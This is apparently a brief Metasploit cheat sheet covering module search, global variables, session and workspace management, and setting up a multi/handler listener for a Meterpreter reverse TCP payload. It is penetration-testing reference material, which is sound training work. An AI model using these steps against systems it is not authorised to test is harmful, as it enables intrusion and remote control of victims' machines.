## Basic usage
- Run the command `msfconsole` to open Metasploit.
- Use `search <vulnerability>` to find different exploits.
- Choose the one you want to use with `use <number>`.
- Use `show options` to select the payload.
- Choose the payload with `set payload <number>`.
- Set the necessary parameters seen with `show options` using `set <parameter> <value>`. Only the ones marked with **yes** are mandatory.
- To execute, use `run` or `exploit`.

## Efficient search
The `search` command in **Metasploit** allows you to find specific modules based on filters.
- To find modules of a particular type, use the `type` filter.
- To find modules by name or related keywords, use the `name` filter.

```bash
# This example lists auxiliary modules for ftp
search type:auxiliary name:ftp
```

## Setting global variables 
In **Metasploit**, you can use **global variables** to avoid manually setting the same value (like `RHOSTS`) every time you switch between modules.

```bash
setg RHOST <target_ip>
```

## Sessions
In **Metasploit**, a session represents an active connection between the attacker and the target system. After exploiting a vulnerability, Metasploit creates a session, allowing the attacker to interact with the compromised system. Sessions can be used for various tasks like running commands, uploading or downloading files, pivoting, or escalating privileges.

```bash
# List all active sessions:
sessions
# Interact with a specific session
sessions -i <session_id>
# Background the current session
background
# Exit a session
sessions -k <session_id>
```

## Workspace
**Workspace** is a feature that allows you to manage multiple sets of data in the Metasploit database. Each workspace acts as a separate container for storing information like host scans, services, vulnerabilities, and credentials, making it easier to organize data from different penetration testing engagements or target environments.

**List Workspaces:**

```bash
workspace
```

**Create a New Workspace:**

```bash
workspace -a <workspace_name>
```

**Switch to a Workspace:**

```bash
workspace <workspace_name>
```

**Delete a Workspace:**

```bash
workspace -d <workspace_name>
```

## Setting a handler
1. **Use the `multi/handler` Module**
This module is used to handle incoming connections from reverse payloads.

```bash
use multi/handler
```

2. **Set the Payload**

```bash
set PAYLOAD windows/meterpreter/reverse_tcp
```

3. **Configure and run**

```bash
set LHOST <your_IP>
set LPORT <your_port>
run
```